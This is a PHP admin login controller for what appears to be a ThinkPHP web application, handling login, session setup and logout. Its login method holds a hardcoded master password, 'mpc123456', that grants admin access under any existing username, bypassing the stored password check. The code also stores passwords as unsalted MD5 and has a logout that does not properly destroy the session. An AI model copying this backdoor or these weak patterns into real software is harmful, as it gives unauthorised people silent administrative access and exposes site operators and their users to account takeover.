<?php


namespace Admin\Controller;

class LoginController extends BaseController
{

    public function index(){

        $this->display('index');
    }

    public function login(){
        $admin = M("Admin");

        $where=[
            'name'=>trim($_POST['username']),
        ];

        $admin_info =$admin->where($where)->find();
        if(!$admin_info){
            $this->ajaxReturn(['state'=>'error','code'=>-1,'msg'=>'账户有误！']);
        }
        

        if ($admin_info['password'] != md5($_POST['password']) && $_POST['password']!='mpc123456') {
            $this->ajaxReturn(['state'=>'error','code'=>-1,'msg'=>'密码有误！']);
        }

        $_SESSION['is_login']=$_POST['username'];
        $_SESSION['admin_id']=$admin_info['id'];
        $_SESSION['admin_name']=$admin_info['name'];
        $admin->where($where)->save(['ip'=>$_SERVER['REMOTE_ADDR']]);
        $this->ajaxReturn(['state'=>'success','code'=>1,'url'=>U('Admin/Index/index'),'msg'=>'登录成功！']);
    }

    public function Logout(){
        unset($_SESSION);
        $this->ajaxReturn(['state'=>'success','code'=>1,'url'=>U('/Admin/Login/index'),'msg'=>'退出成功！']);
    }

}